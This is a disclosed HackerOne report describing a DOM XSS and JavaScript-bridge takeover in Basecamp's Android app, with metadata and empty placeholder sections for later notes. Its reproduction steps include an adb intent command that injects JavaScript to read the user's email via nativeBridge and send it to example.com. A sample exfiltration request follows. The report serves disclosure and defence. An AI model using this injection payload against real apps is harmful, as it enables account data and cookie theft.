---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1343300'
original_report_id: '1343300'
title: com.basecamp.bc3 Webview Javascript Injection and JS bridge takeover
weakness: Cross-site Scripting (XSS) - DOM
team_handle: basecamp
created_at: '2021-09-18T13:11:19.377Z'
disclosed_at: '2022-09-23T09:33:57.203Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 14
asset_identifier: com.basecamp.bc3
asset_type: GOOGLE_PLAY_APP_ID
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# com.basecamp.bc3 Webview Javascript Injection and JS bridge takeover

## Metadata

- HackerOne Report ID: 1343300
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: basecamp
- Disclosed At: 2022-09-23T09:33:57.203Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

It was identified that the android **com.basecamp.bc3 application**, contains a Webview where the loaded URLs are not sanitised properly. As this webview's functionality is extended via javascript interfaces and has the javascript enabled it is possible to inject arbitrary javascript code which will be executed by the application's webview and provide access to the java native code via the class **a.a.a.s.g** ( which is exposed via the NativeApp).  

##JS Bridge

The following JS Bridges are exposed:

###nativeBridge

{F1452715}

###NativeApp


{F1452717}

###TurboNative

{F1452718}

##Steps to Reproduce

1. Create a valid basecamp account 
2. Create a project 

{F1452720}

3. Open any Sub-project tab (e.g. Message Board - it is needed only ONE time in order to initialise the JS interface  )


Run the following command after replacing the XXXXX with the user id 

Example: {F1452730}

Command:
```
$adb shell am start -W -a android.intent.action.VIEW -d 'https://3.basecamp.com/XXXXX/p","advance","---"); /* comment */ window.location.replace("https://example.com?exfiltration="+nativeBridge.getPage().accountName); //'
```

Observer the HTTP requests of the app:

```
GET /?exfiltration=USER_EMAIL@gmail.com HTTP/2
Host: example.com
....
````

## Impact

Confidentiality, Integrity and availability are all affected from the specific vulnerability as the javascript code can be injected to an already loaded url while additional functionality is added via the exposed javascript interfaces:

###Javascript Injection:

{F1452742}

###Bridge Access

"Bucket Name:"+nativeBridge.getPage().bucketName + "Title: " + nativeBridge.getPage().title + "User email:" +nativeBridge.getPage().accountName);

{F1452750}

### Cookie exfiltration:

{F1452769}

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
